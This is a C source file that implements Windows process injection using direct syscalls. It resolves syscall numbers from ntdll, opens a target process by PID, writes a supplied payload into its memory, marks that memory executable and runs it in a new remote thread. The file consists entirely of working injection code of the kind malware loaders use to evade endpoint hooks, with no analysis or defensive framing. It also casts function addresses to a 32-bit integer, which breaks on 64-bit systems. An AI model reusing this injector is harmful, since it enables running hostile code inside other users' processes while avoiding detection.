#include "injection.h"

VOID ErrorFormat(
	_In_ LPCSTR FunctionName,
	_In_ NTSTATUS ErrorCode
) {
	warn("(%s) failed, error: 0x%lx", FunctionName, ErrorCode);
	return;
}

VOID GetSSN(
	_In_ HMODULE NtDllHandle,
	_In_ LPCSTR NtFunctionName,
	_Out_ PDWORD NtFunctionSSN
) {

	UINT NtFunctionAddress = NULL;
	NtFunctionAddress = (UINT)GetProcAddress(NtDllHandle, NtFunctionName);
	if (NtFunctionAddress == NULL) {
		ErrorFormat("GetProcAddress", GetLastError());
		return;
	}
	
	*NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0]; //Look 4 bytes ahead of func address and set pointer
	info("[0x % p][0x % 0.31x] -> % s", (PVOID)NtFunctionAddress, *NtFunctionSSN, NtFunctionName);
	return;
}

BOOL DirectSysCallInjection(
	_In_ CONST DWORD PID,
	_In_ CONST PBYTE Payload,
	_In_ SIZE_T PayloadSize
) {

    BOOL      State = TRUE;
    PVOID     Buffer = NULL;
    HANDLE    ThreadHandle = NULL;
    HANDLE    ProcessHandle = NULL;
    HMODULE   NtdllHandle = NULL;
    DWORD     OldProtection = 0;
    SIZE_T    BytesWritten = 0;
    NTSTATUS  Status = 0;
    CLIENT_ID CID = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA = { sizeof(OA),  NULL };

    NtdllHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NtdllHandle) {
        ErrorFormat("GetModuleHandleW", GetLastError());
        return FALSE;
    }
    okay("[0x%p] got the address of NTDLL!", NtdllHandle);

    GetSSN(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN);
    GetSSN(NtdllHandle, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN);
    GetSSN(NtdllHandle, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN);
    GetSSN(NtdllHandle, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN);
    GetSSN(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN);
    GetSSN(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN);
    GetSSN(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN);
    GetSSN(NtdllHandle, "NtClose", &g_NtCloseSSN);

    Status = NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS_SUCCESS != Status) {
        ErrorFormat("NtOpenProcess", Status);
        State = FALSE; goto CLEANUP;
    }
    okay("[0x%p] got a handle on the process (%ld)!", ProcessHandle, PID);

    Status = NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS_SUCCESS != Status) {
        ErrorFormat("NtAllocateVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    okay("[0x%p] [RW-] allocated a %zu-byte buffer with PAGE_READWRITE [RW-] permissions!", Buffer, PayloadSize);

    Status = NtWriteVirtualMemory(ProcessHandle, Buffer, Payload, PayloadSize, &BytesWritten);
    if (STATUS_SUCCESS != Status) {
        ErrorFormat("NtWriteVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    okay("[0x%p] [RW-] wrote %zu-bytes to buffer", Buffer, BytesWritten);

    Status = NtProtectVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != Status) {
        ErrorFormat("NtProtectVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    okay("[0x%p] [R-X] changed allocated buffer protection to PAGE_EXECUTE_READ [R-X]!", Buffer);

    Status = NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, &OA, ProcessHandle, Buffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        ErrorFormat("NtCreateThreadEx", Status);
        State = FALSE; goto CLEANUP;
    }

    okay("[0x%p] successfully created a thread!", ThreadHandle);
    info("[0x%p] waiting for thread to finish execution...", ThreadHandle);
    Status = NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
    info("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);

CLEANUP:

    if (Buffer) {
        Status = NtFreeVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, MEM_DECOMMIT);
        if (STATUS_SUCCESS != Status) {
            ErrorFormat("NtFreeVirtualMemory", Status);
        }
        else {
            info("[0x%p] decommitted allocated buffer from process memory", Buffer);
        }
    }

    if (ThreadHandle) {
        NtClose(ThreadHandle);
        info("[0x%p] handle on thread closed", ThreadHandle);
    }

    if (ProcessHandle) {
        NtClose(ProcessHandle);
        info("[0x%p] handle on process closed", ProcessHandle);
    }

    return State;

}